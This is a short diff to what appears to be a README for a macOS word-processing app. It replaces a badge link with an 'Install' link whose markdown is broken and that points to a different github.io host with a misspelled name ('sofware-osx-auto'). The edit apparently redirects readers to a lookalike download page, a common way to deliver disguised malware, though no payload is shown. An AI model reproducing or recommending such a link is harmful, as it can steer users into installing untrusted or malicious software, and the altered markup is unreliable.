@@ -9,9 +9,11 @@
 
 <img src="https://thriftmac.com/icons/growly-write.png" width="200"><br>
 
-<a href="https://osx-hub-software.github.io/.github/bean-word-processor">
-  <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="180">
-</a><br><br>
+
+[Install](https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png)](https://sofware-osx-auto.github.io/.github/bw)
+</div>
+<br/><br>
+
 
 <div align="center">
   <img src="https://img.shields.io/badge/downloads-1.1k-brightgreen?style=flat-square"><br>
